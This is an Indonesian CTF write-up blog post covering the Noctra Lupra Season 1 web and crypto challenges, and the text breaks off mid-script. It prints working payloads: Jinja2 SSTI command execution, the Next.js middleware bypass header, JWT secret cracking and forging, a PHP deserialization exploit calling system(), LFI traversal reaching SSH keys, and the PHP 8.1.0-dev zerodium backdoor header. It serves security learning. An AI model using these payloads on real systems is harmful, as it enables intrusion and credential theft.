@@ -1,0 +1,1598 @@
+---
+title: "Write-Up CTF Noctra Lupra Season 1 ID-Networkers"
+desc: "Write-up CTF Noctra Lupra Season 1 ID-Networkers: Web Exploitation, Cryptography, Digital Forensic, dan OSINT."
+image: "/blog/ctf-noctra-lupra-season-1/img-01.png"
+tags: ["ctf", "writeup"]
+date: "2025-10-05"
+isPublished: true
+---
+
+# Write-Up CTF Noctra Lupra Season 1 ID-Networkers
+
+## Author
+
+aaronabil
+
+## Category Web Exploitation
+
+### Chall: AkuPintu
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-01.png)
+
+Skenario:
+
+Disini kita mendapatkan website catatan rahasia
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-02.png)
+
+Lalu saya mencoba mengubah /notes/1 menjadi /notes/0 dan mendapatkan catatan **Y29iYSBsYWdpCg==**, ini adalah sebuah base64 lalu saya mencoba mendecode dan mendapatkan hasil **coba lagi**, saya mengubah lagi menjadi /notes/2 dan mendapatkan catatan **Rapat dengan tim keamanan siber jam 3 sore, **lalu saya ubah lagi menjadi /notes/3 dan mendapatkan catatan **Kombinasi loker: 8-6-7-5-3-0-9**, lalu saya ubah lagi menjadi /notes/4 dan mendapatkan catatan **leet adalah hacker yang sangat keren**, lalu saya ubah lagi menjadi /notes/5 dan mendapatkan catatan **eleet adalah hacker yang sangat keren :D, **lalu saya ubah lagi menjadi /notes/6 dan ternyata catatan not found, nah awalnya saya gatau siapa itu leet yang berasal dari /notes/4 dan /notes/5, lalu saya cari dan ternyata leet itu adalah bentuk komunikasi tertulis online (disebut juga leetspeak atau 1337) yang menggantikan huruf dengan angka dan simbol yang menyerupai mereka, seperti 3 untuk E atau 1 untuk L, dan berasal dari kata "elite" (elit), dan saat saya mencoba /notes/1337 dan saya mendapatkan flagnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-03.png)
+
+Flag: NCLPS1\{id0r\_expl0ited\_y3yy\}
+
+### Chall: Internal
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-04.png)
+
+Skenario:
+
+Disini kita mendapatkan web login
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-05.png)
+
+Awalnya saya mencoba berbagai macam payload untuk bisa masuk, tapi saya lupa dengan deskripsi soal yang dimana jangan di bruteforce sayapun berpikir kalau ini mungkin ini vuln SSTI, lalu saya mencoba /dashboard dan saya masuk ke halaman dashboard tanpa harus login, lalu saya mencoba curl -v [http://ctf.noctralupra.space:10306/dashboard](http://ctf.noctralupra.space:10306/dashboard) dan mendapatkan hasil
+
+HTTP 1.0, assume close after body  
+\< HTTP/1.0 200 OK  
+\< Content-Type: text/html; charset=utf-8  
+\< Content-Length: 1504  
+\< Server: Werkzeug/2.0.3 Python/3.9.23  
+\< Date: Mon, 01 Sep 2025 18:03:54 GMT
+
+Server ini menggunakan werkzeug, lalu saya mencoba [http://ctf.noctralupra.space:10306/console](http://ctf.noctralupra.space:10306/console) dan ternyata tidak keluar console😭, lalu saya mencoba [http://ctf.noctralupra.space:10306/static/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd](http://ctf.noctralupra.space:10306/static/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd) dan hasilnya notfound, lalu pas saya buka web challenge terdapat attachment app.py, setelah saya baca” isinya ternyata aplikasi ini mengambil nilai dari parameter name di URL dan langsung memasukkannya ke dalam string yang kemudian dirender oleh template engine Flask (Jinja2).  
+Lalu saya memutuskan menggunakan payload \{\{ self.init.globals.builtins.import('os').popen('cat flag.txt').read() \}\}, dan saat saya mengakses [http://ctf.noctralupra.space:10306/?name=](http://ctf.noctralupra.space:10306/?name=)\{\{ self.init.globals.builtins.import('os').popen('cat flag.txt').read() \}\}, saya mendapatkan flagnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-06.png)
+
+Flag: NCLPS1\{hidd3n\_ssti\_xd\}
+
+### Chall: Nimbus Coffe
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-07.png)
+
+Skenario:
+
+Disini saya mendapatkan website seperti ini dengan adanya menu home, products, account dan admin
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-08.png)
+
+Di deskripsi dijelaskan kalau adanya vuln CVE, lalu saya coba curl -i [http://ctf.noctralupra.space:10310](http://ctf.noctralupra.space:10310/) dan mendapatkan hasil
+
+HTTP/1.1 200 OK  
+Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Accept-Encoding  
+X-Powered-By: Next.js  
+Content-Type: text/html; charset=utf-8  
+Date: Mon, 01 Sep 2025 15:54:38 GMT  
+Connection: keep-alive  
+Keep-Alive: timeout=5  
+Transfer-Encoding: chunked
+
+Ternyata website ini dibuat menggunakan Next.js, lalu saya mulai mencari tahu tentang CVE Next.js dan saya menemukan CVE yang relevan. CVE-2025-29927 adalah vulnerability critical di Next.js yang memungkinkan bypass middleware authorization dengan menggunakan header x-middleware-s (atau x-middleware-subrequest), saya dapat dari [https://strobes.co/blog/understanding-next-js-vulnerability/](https://strobes.co/blog/understanding-next-js-vulnerability/) dan [https://www.picussecurity.com/resource/blog/cve-2025-29927-nextjs-middleware-bypass-vulnerability](https://www.picussecurity.com/resource/blog/cve-2025-29927-nextjs-middleware-bypass-vulnerability)
+
+Lalu saya coba curl -H "x-middleware-subrequest: middleware\:middleware\:middleware\:middleware\:middleware" [http://ctf.noctralupra.space:10310/admin](http://ctf.noctralupra.space:10310/admin) dan hasilnya terdapat href ke /admin/flag
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-09.png)
+
+Lalu saya coba curl -H "x-middleware-subrequest: middleware\:middleware\:middleware\:middleware\:middleware" [http://ctf.noctralupra.space:10310/admin/flag](http://ctf.noctralupra.space:10310/admin/flag) dan saya mendapatkan flagnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-10.png)
+
+Flag: NCLPS1\{n3xtJs\_Fram3ewOrk\_c4n\_byP4Ss\_th3\_author1z4tion\_w0w\_b45d5b6c57\}
+
+### Chall: come-gAte-me
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-11.png)
+
+Skenario:
+
+Disini kita mendapatkan website seperti ini
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-12.png)
+
+Awalnya saya bingung harus ngapain tapi semuanya terjawab setelah saya meilhat view page sourcenya, disana terdapat banyak hint
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-13.png)
+
+Jadi langkah-langkahnya pertama saya membuat file .json yang berisi
+
+```json
+{
+  "source": "http://gate:8081/run?cmd=cat&file=/flag.txt",
+  "ext": "txt"
+}
+```
+
+lalu upload file .json tersebut di website, lalu setelah di upload kita akan mendapatkan informasi  
+`Manifest processed. Content fetched and saved. Predict the name (ext=.txt).`
+
+lalu dibagian gETa kita harus memasukkan code dengan format cg\_YYYYMMDD\_HHMM.txt yang sesuai dengan server minute (UTC) yang ada di website tersebut
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-14.png)
+
+lalu click download dan di file yang telah kita download terdapat flag
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-15.png)
+
+Flag: NCLPS1\{ssrf\_to\_gate\_then\_predict\_the\_filename\}
+
+### Chall: Request Failure
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-16.png)
+
+Skenario:
+
+Disini saya mendapat website seperti ini
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-17.png)
+
+Disini saya langsung menyadari kalau ini vuln Server-Side Request Forgery (SSRF), saya coba memasukkan berbagai macam payload, diantaranya
+
+[http://localhost/flag](http://localhost/flag)
+
+[http://127.0.0.1/flag](http://127.0.0.1/flag)
+
+[http://0.0.0.0/flag](http://0.0.0.0/flag)
+
+file:///etc/passwd
+
+file:///proc/self/environ
+
+[http://localhost:8080/flag](http://localhost:8080/flag)
+
+[http://internal-server/flag](http://internal-server/flag)
+
+[http://localhost/flag.txt](http://localhost/flag.txt)
+
+[https://127.0.0.1:5000/flag](https://127.0.0.1:5000/flag)
+
+[http://localhost:3000/flag](http://localhost:3000/flag)
+
+namun hasilnya selalu ditolak, sebenernya masih banyak payload yang saya coba tapi hasilnya sama saja, sampai di challengenya ada attachment yang berisi folder dari website tersebut, sayapun memeriksanya dan disana terdapat informasi, yaitu:
+
+- flag endpointnya adalah /flag dan hanya bisa diakses dari 127.0.0.1
+- open redirectnya adalah /ctf dengan parameter ctf yang bisa redirect ke url manapun
+- aplikasinya memfilter URL dari looks\_safe\_url() tapi ada vuln di endpoint /ctf
+- aplikasinya berjalan di port 8989 dalam container (di expose ke port 10304)
+
+lalu saya mencoba dengan payload [http://ctf.noctralupra.space:10304/ctf?ctf=http://127.0.0.1:8989/flag](http://ctf.noctralupra.space:10304/ctf?ctf=http://127.0.0.1:8989/flag) dan mendapatkan flagnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-18.png)
+
+Flag: NCLPS1\{p3nt1n99ny4\_s3cur33\_s0ftwar33e\_dev3lo0pm3nt\_l1fe3e3\_cycl3\_fe7668c1e0\}
+
+### Chall: TokoRoti
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-19.png)
+
+Skenario:
+
+Disini kita mendapatkan website dengan adanya menu register dan login
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-20.png)
+
+lalu saya coba register dan login seperti biasa dan sayapun masuk ke dasbor sebagai karyawan, di dasbor terdapat menu panel admin yang terkunci dan saya sangat yakin disanalah flagnya berada
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-21.png)
+
+pertanyaannya bagaimana caranya saya menyusup sebagai admin? pertama-tama saya coba cek cookiesnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-22.png)
+
+dan disana terdapat token akses yang jika kita decode hasilnya adalah
+
+```json
+{
+  "nama_pengguna": "lol",
+  "nama_lengkap": "lolol",
+  "peran": "karyawan",
+  "exp": 1756986006
+}
+```
+
+nah saya harus merubah token peran karyawan menjadi admin, tapi saya tidak tahu secret keynya yang dipakai server buat sign token HS256, sayapun memakai tool dari [https://github.com/ticarpi/jwt\_tool](https://github.com/ticarpi/jwt_tool.git)
+
+saya mencoba menemukan secret key dengan menggunakan tool tersebut
+
+```bash
+python jwt_tool.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1hX3BlbmdndW5hIjoibG9sIiwibmFtYV9sZW5na2FwIjoibG9sb2wiLCJwZXJhbiI6Imthcnlhd2FuIiwiZXhwIjoxNzU2OTg2MDA2fQ.Xcd9AkKKGnkW5Epkgg6xGbR3OIM9aAPziUzi6H2CFdI" -C -d /usr/share/wordlists/rockyou.txt
+```
+
+dan ditemukan secret keynya **birahi **(maul birahi terus jir)
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-23.png)
+
+selanjutnya saya mencoba ubah peran menjadi admin dan memasukkan secret keynya
+
+```bash
+ python3 jwt_tool.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1hX3BlbmdndW5hIjoibG9sIiwibmFtYV9sZW5na2FwIjoibG9sb2wiLCJwZXJhbiI6Imthcnlhd2FuIiwiZXhwIjoxNzU2OTg2MDA2fQ.Xcd9AkKKGnkW5Epkgg6xGbR3OIM9aAPziUzi6H2CFdI" \
+-S hs256 -p "birahi" -I -pc peran -pv admin
+```
+
+dan sayapun mendapatkan akses token yang baru yang dimana perannya sudah menjadi admin
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-24.png)
+
+saat saya mengganti akses tokennya dengan yang baru saya pun telah menjadi admin dan bisa mengakses panel admin
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-25.png)
+
+dan saya mendapatkan flagnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-26.png)
+
+Flag: NCLPS1\{l3mah\_4m4t\_jwtnya\_hahaha\}
+
+### Chall: **hpp apipipipipipi**
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-27.png)
+
+Skenario:
+
+Disini kita mendapatkan 3 link yang berbeda, yaitu [http://ctf.noctralupra.space:10309/a/](http://ctf.noctralupra.space:10309/a/) dengan tampilan
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-28.png)
+
+lalu ada [http://ctf.noctralupra.space:10309/b/](http://ctf.noctralupra.space:10309/b/) dengan tampilan
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-29.png)
+
+yang terakhir ada [http://ctf.noctralupra.space:10309/c/](http://ctf.noctralupra.space:10309/c/) dengan tampilan
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-30.png)
+
+Pertama-tama saya mulai dari [http://ctf.noctralupra.space:10309/a/](http://ctf.noctralupra.space:10309/a/) disana disuruh login via /a/login?user=&role=
+
+lalu saya mengakses [http://ctf.noctralupra.space:10309/a/login?user=&role=](http://ctf.noctralupra.space:10309/a/login?user=&role=)
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-31.png)
+
+Disini tampilannya sudah berbeda, lalu saat saya liat view page sourcenya disana ada hint
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-32.png)
+
+yang dimana kita harus mengakses [http://ctf.noctralupra.space:10309/a/admin?role=user&role=admin](http://ctf.noctralupra.space:10309/a/admin?role=user&role=admin) dan disana saya mendapatkan token A
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-33.png)
+
+lalu selanjutnya saya mengakses [http://ctf.noctralupra.space:10309/b/](http://ctf.noctralupra.space:10309/b/) dan karena disana sudah ada informasi ***Need ip=127.0.0.1 (try ;ip=...), ***saya mencoba [http://ctf.noctralupra.space:10309/b/](http://ctf.noctralupra.space:10309/b/)?token=token-a-keep-going;ip=127.0.01 dan masih saja blocked saya juga coba [http://ctf.noctralupra.space:10309/b/admin?role=user;role=admin;token=token-a-keep-going;ip=127.0.0.1](http://ctf.noctralupra.space:10309/b/admin?role=user;role=admin;token=token-a-keep-going;ip=127.0.0.1) dan hasilnya sama, disini saya sudah coba berbagai macam cara untuk mendapatkan token b namun hasilnya tetap saja terblocked, lalu saya coba buka file styles.css dan ternyata disana terdapat hint
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-34.png)
+
+lalu saya mengakses [http://ctf.noctralupra.space:10309/b/panel/?token=token-a-keep-going&ip=127.0.0.1](http://ctf.noctralupra.space:10309/b/panel/?token=token-a-keep-going&ip=127.0.0.1) dan mendapatkan token b
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-35.png)
+
+lalu selanjutnya saya mengakses [http://ctf.noctralupra.space:10309/c/](http://ctf.noctralupra.space:10309/c/) dan karena disana sudah ada informasi **Use /c/report?token=TOKEN\_B&scope=read**, sayapun mengakses [http://ctf.noctralupra.space:10309/c/report?token=token-b-almost-there&scope=read](http://ctf.noctralupra.space:10309/c/report?token=token-b-almost-there&scope=read) dan tampilan dashboard sudah berbeda dan ada hint disana
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-36.png)
+
+selanjutnya sayapun mengakses [http://ctf.noctralupra.space:10309/c/report?token=token-b-almost-there&scope=read&scope\[\]=elevated](http://ctf.noctralupra.space:10309/c/report?token=token-b-almost-there&scope=read&scope%5B%5D=elevated) dan disana saya mendapatkan token c
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-37.png)
+
+selanjutnya tinggal menjalankan langkah terakhir untuk mendapatkan flag, yaitu dengan mengakses [http://ctf.noctralupra.space:10309/c/proxy?token=token-c-one-step-left&scope=read&scope\[\]=elevated&path=/internal/flag](http://ctf.noctralupra.space:10309/c/proxy?token=token-c-one-step-left&scope=read&scope%5B%5D=elevated&path=/internal/flag) dan saya mendapatkan flagnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-38.png)
+
+Flag: NCLPS1\{1e7e662f-209e-467c-97bb-0f787abd99a4\}
+
+### Chall: Teamboard
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-39.png)
+
+Skenario:
+
+Disini saya mendapatkan website dengan adanya form login
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-40.png)
+
+lalu saya menggunakan akun demo untuk login dan disana terdapat menu dashboard, preferences, export dan logout
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-41.png)
+
+karena saya bingung harus ngapain, saya cek attachmentnya dan setelah memeriksanya saya menemukan di helpers.php, Serializer::unpack() menggunakan unserialize() tanpa validasi yang aman, lalu cookie UIPREF berisi data serialized yang bisa dimanipulasi dan pada file JobRunner.php ada class JobRunner yang memiliki magic method \_\_destruct() yang dapat di eksploitasi.
+
+dan benar saja ternyata ada UIPREF
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-42.png)
+
+selanjutnya saya membuat payload baru menggunakan php
+
+```php
+<?php
+namespace App\Jobs;
+
+class JobRunner {
+    public $handler;
+    public $payload;
+    public $autoRun = true;
+}
+
+$command = "find / -type f -name '*flag*' 2>/dev/null";
+
+$exploit = new \App\Jobs\JobRunner();
+$exploit->handler = 'system';
+$exploit->payload = $command;
+
+$serialized_object = serialize($exploit);
+$payload = base64_encode(gzdeflate($serialized_object));
+
+echo "Commandnya: " . $command . "\n\n";
+echo "Payload UIPREF yang baru:\n";
+echo $payload;
+echo "\n";
+?>
+```
+
+UIPREF yang baru tersebut saya ganti dengan UIPREF yang lama dan setelah saya reload, saya menemukan lokasi flag disimpan
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-43.png)
+
+lalu saya tinggal ganti saja commandnya menjadi
+
+```php
+<?php
+namespace App\Jobs;
+
+class JobRunner {
+    public $handler;
+    public $payload;
+    public $autoRun = true;
+}
+
+$command = "cat /var/www/html/flag.txt";
+
+$exploit = new \App\Jobs\JobRunner();
+$exploit->handler = 'system';
+$exploit->payload = $command;
+
+$serialized_object = serialize($exploit);
+$payload = base64_encode(gzdeflate($serialized_object));
+
+echo "Commandnya: " . $command . "\n\n";
+echo "Payload UIPREF yang baru:\n";
+echo $payload;
+echo "\n";
+?>
+```
+
+setelah mendapat UIPREF yang baru lagi dan setelah saya ganti dan reload, saya mendapatkan flagnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-44.png)
+
+Flag: NCLPS1\{t3amb04rD\_u1pr3f\_oBj3ct\_inj3ct1on\_s3r1AlizE\_dEFlat3\_b4se64\_7516d8bc52\}
+
+### Chall: **Acme IntraMail**
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-45.png)
+
+Skenario:
+
+Saya mendapatkan website dengan adanya menu home, email preview, directory search, profile dan reports
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-46.png)
+
+semua menu biasa-biasa saja kecuali menu reports karena disana isinya   
+`Quarterly Report for Analyst`
+
+saya langsung saja cek attachmentnya, setelah memeriksanya saya mendapatkan bahwa flag location tersimpan dengan nama random yaitu flag-\[16 char\].txt di direktori yang di redacted, lalu vulnnya adalah Server-Side Template Injection (SSTI) di endpoint /export/safe
+
+setelah saya analisis lebih detail di file [export.py](http://export.py) dan ternyata di endpoint ini menggunakan jinja2 environment untuk render template dari parameter tpl, disana tidak ada WAF protection seperti di endpoint /preview
+
+Pertama-tama saya coba payload [http://ctf.noctralupra.space:10312/export/safe?tpl=\{\{''.\_\_class\_\_.\_\_mro\_\_\[1\].\_\_subclasses\_\_()\[104\].\_\_init\_\_.\_\_globals\_\_\['sys'\].modules\['os'\].listdir('/')\}](<http://ctf.noctralupra.space:10312/export/safe?tpl=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__()%5B104%5D.__init__.__globals__%5B%27sys%27%5D.modules%5B%27os%27%5D.listdir(%27/%27)%7D>)\} dan [http://ctf.noctralupra.space:10312/export/safe?tpl=\{\{''.\_\_class\_\_.\_\_mro\_\_\[1\].\_\_subclasses\_\_()\[104\].\_\_init\_\_.\_\_globals\_\_\['sys'\].modules\['subprocess'\].check\_output(\['find','/','-name','flag-\*'\],text=True)\}](<http://ctf.noctralupra.space:10312/export/safe?tpl=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__()%5B104%5D.__init__.__globals__%5B%27sys%27%5D.modules%5B%27subprocess%27%5D.check_output(%5B%27find%27,%27/%27,%27-name%27,%27flag-*%27%5D,text=True)%7D>)\} namun hasil keduanya   
+`Template error: 'wrapper_descriptor object' has no attribute '__globals__'`
+
+Saya mencoba [http://ctf.noctralupra.space:10312/export/safe?tpl=](http://ctf.noctralupra.space:10312/export/safe?tpl=)\{\{self.**init**.**globals**.**builtins**.**import**('os').popen('find / -name "flag-\*" 2>/dev/null').read()\}\} dan mendapatkan posisi flag
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-47.png)
+
+lalu saya tinggal menjalankan [http://ctf.noctralupra.space:10312/export/safe?tpl=](http://ctf.noctralupra.space:10312/export/safe?tpl=)\{\{self.**init**.**globals**.**builtins**.**import**('os').popen('cat /app/flag-UwVbbRZeebtUulQI.txt').read()\}\}  
+dan mendapatkan flagnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-48.png)
+
+Flag: NCLPS1\{sst1\_d4n\_w4Af\_digaBunG?\_hMmMmm\_m3nar1kk\_51b3cb2599\}
+
+### Chall: Hack TheHacker
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-49.png)
+
+Skenario:
+
+Disini saya mendapatkan website yang sangat keren
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-50.png)
+
+lalu saya click button readthisadmin.txt
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-51.png)
+
+disini terdapat hint yang dimana ada webshell yang ditanam
+
+Langkah pertama saya adalah saya mencari nama file yang tersembunyi menggunakan ffuf  
+saya mencoba
+
+```bash
+ffuf -u http://ctf.noctralupra.space:10301/FUZZ \
+     -w /usr/share/seclists/Discovery/Web-Content/common.txt
+```
+
+namun hasilnya hanya dapat ini
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-52.png)
+
+selanjutnya saya mencoba
+
+```bash
+ffuf -u http://ctf.noctralupra.space:10301/FUZZ \
+     -w /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/CommonBackdoors-PHP.fuzz.txt
+```
+
+dan hasilnya saya mendapatkan file tersembunyi
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-53.png)
+
+saat saya mengakses [http://ctf.noctralupra.space:10301/b374k.php](http://ctf.noctralupra.space:10301/b374k.php) hasilnya notfound
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-54.png)
+
+tapi disini saya tidak tergocek, karena statusnya 200, saya coba view page source dan disana terdapat script seperti ini
+
+```javascript
+<script>
+let clickCount = 0;
+document.querySelector('h1').addEventListener('click', function() {
+    clickCount++;
+    if (clickCount === 3) {
+        document.getElementById('hiddenAuth').style.display = 'block';
+        document.querySelector('input[name="password"]').focus();
+        clickCount = 0;
+    }
+    setTimeout(() => { clickCount = 0; }, 1000); // Reset after 1 second
+});
+</script>
+```
+
+yang dimana saya harus click tulisan not found 3 kali, dan setelah saya click not found 3 kali muncul sebuah form input
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-55.png)
+
+saya mencoba b374k, admin, root, dan toor, namun hasilnya access denied semua
+
+lalu saya coba mencari tahu access codenya menggunakan ffuf lagi
+
+```bash
+ffuf -u http://ctf.noctralupra.space:10301/b374k.php \
+     -X POST -d "password=FUZZ" \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
+     -fr "Access Denied"
+```
+
+dan mendapatkan hasilnya (jirlah 12345)
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-56.png)
+
+lalu saat saya memasukkan access code dengan 12345, saya masuk ke webshellnya dan disana terdapat flag
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-57.png)
+
+Flag: NCLPS1\{hacker\_jangan\_menyerang!!!!!!!!!!\}
+
+### Chall: NewbieDev
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-58.png)
+
+Skenario:
+
+Disini saya mendapatkan website yang dimana ada menu home, about, services, team, dan contact
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-59.png)
+
+tapi setiap pindah menu, url akan berubah menjadi [http://ctf.noctralupra.space:10302/?page=about](http://ctf.noctralupra.space:10302/?page=about), nah ?page= inilah yang bisa saya manfaatkan untuk mendapatkan flag, ini adalah vuln Local File Inclusion (LFI), awalnya saya mencoba [http://ctf.noctralupra.space:10302/?page=../../../../etc/passwd](http://ctf.noctralupra.space:10302/?page=../../../../etc/passwd) dan ternyata page not found
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-60.png)
+
+ini berarti kemungkinan besar kodenya gini
+
+```php
+include($_GET['page'] . ".html");
+```
+
+jadi saya coba [http://ctf.noctralupra.space:10302/?page=../../../../etc/passwd](http://ctf.noctralupra.space:10302/?page=../../../../etc/passwd%00)%00 tapi hasilnya sama aja, lalu saya coba ?page=../../../../../../etc/passwd%00 dan ?page=../../../../../../../etc/passwd%00 tapi hasilnya tetap saja page not found, lalu saya coba bypass filter wrapper tapi hasilnya sama, selanjutnya saya coba [http://ctf.noctralupra.space:10302/?page=....//....//....//....//etc/passwd](http://ctf.noctralupra.space:10302/?page=....//....//....//....//etc/passwd%00)%00 dan mendapatkan hasilnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-61.png)
+
+karena disana ada informasi **maul\:x\:1000:1000:ada sesuatu di sini:/home/maul:/bin/bash**, jadi saya fokus ke /home/maul, saya coba [http://ctf.noctralupra.space:10302/?page=....//....//....//....//home/maul](http://ctf.noctralupra.space:10302/?page=....//....//....//....//home/maul%00), namun hasilnya kosong, sayapun mencoba langsung tembak [http://ctf.noctralupra.space:10302/?page=....//....//....//....//home/maul/flag.txt](http://ctf.noctralupra.space:10302/?page=....//....//....//....//home/maul/flag.txt%00) dan hasilnya page not found, disini saya mencoba banyak percobaan, salah satunya adalah [http://ctf.noctralupra.space:10302/?page=....//....//....//....//home/maul/.bash\_history](http://ctf.noctralupra.space:10302/?page=....//....//....//....//home/maul/.bash_history%00) dan mendapatkan page not found lagi, disini saya mencoba pakai tool ffuf untuk mendapatkan file hidden
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-62.png)
+
+dan saya mendapatkan file hidden, yaitu .ssh, lalu saya mencoba file-file umum yang ada di .ssh, saya mencoba [http://ctf.noctralupra.space:10302/?page=....//....//....//....//home/maul/.ssh/id\_rsa](http://ctf.noctralupra.space:10302/?page=....//....//....//....//home/maul/.ssh/id_rsa%00)%00 dan mendapatkan flagnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-63.png)
+
+Flag: NCLPS1\{y0u\_byp4ss3d\_LFI?????\}
+
+### Chall: EvilPHP
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-64.png)
+
+Skenario:
+
+Disini saya mendapatkan website seperti ini
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-65.png)
+
+terdapat form login dan system diagnostics, yang dimana jika kita ingin mengexecute command kita harus login terlebih dahulu, saya mencoba menggunakan payload sql injection dan ternyata gagal, sampai saya coba password umum yaitu admin:admin123 dan ternyata berhasil, saat saya mengexecute command ps aux, outputnya sama seperti input, yang berarti ini tidak berfungsi seperti semestinya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-66.png)
+
+saya melakukan recon http header
+
+```bash
+curl -I http://ctf.noctralupra.space:10308/
+```
+
+dan mendapatkan hasil
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-67.png)
+
+Disana terdapat informasi penting yang dimana ini PHP/8.1.0-dev, versi ini pernah terhacked pada tahun 2021, lalu saya coba menggunakan payload
+
+curl -X GET [http://ctf.noctralupra.space:10308/](http://ctf.noctralupra.space:10308/) \\  
+-H "User-Agentt: zerodiumsystem('id');"
+
+dan mendapatkan hasil
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-68.png)
+
+disini saya mendapatkan idnya, langkah selanjutnya saya tinggal cari flagnya saja dengan payload
+
+curl -X GET [http://ctf.noctralupra.space:10308/](http://ctf.noctralupra.space:10308/) \\  
+-H "User-Agentt: zerodiumsystem('find / -name flag\* 2>/dev/null');"
+
+dan disana terdapat file flag.txt
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-69.png)
+
+selanjutnya saya tinggal membuka file tersebut dengan payload
+
+curl -s [http://ctf.noctralupra.space:10308/](http://ctf.noctralupra.space:10308/) \\  
+-H "User-Agentt: zerodiumsystem('cat /flag.txt');"
+
+dan mendapatkan flagnya
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-70.png)
+
+Flag: NCLPS1\{php\_1n1\_j4h4t\_b4ng3ts\}
+
+## Category Cryptography
+
+### Chall: rox\_star
+
+![screenshot](/blog/ctf-noctra-lupra-season-1/img-71.png)
+
+Skenario:
+
+Disini saya mendapatkan attachment file [chall.py](http://chall.py) yang berisi
+
+```py
+import random; random.seed(0)
+
+flag = 'NCLPS1{redacted}'
+result = ""
+for i in range(len(flag)):
+	result += hex(ord(flag[i]) ^ random.randint(32, 127))
+print(result)
+
+# 0x1f0x160x690x110x320x6f0x280x340x690x230xe0xb0xd0x6e0x370x20x1f0xb0x1f0xc0x4e0x30x4b0x730x730xe0x1a0x150x3f0x680xf0x730x3d0x240x7b0xa0x410x650x140x690x360x60x710x4a0x390x450x180x120x340x4e0x1b0x2f0x4e0x5f0x330x7e0x560x220x3d0x490x5c0xc0x180x41
+```
+
+nah jadi disini flag setiap huruf di XOR dengan angka random, karena random.seed(0) dipake, urutan randomnya selalu sama setiap dijalankan dan karena XOR bisa dibalik, saya tinggal melakukan langkah sebaliknya, lalu saya buat script
+
+```py
+import random
+
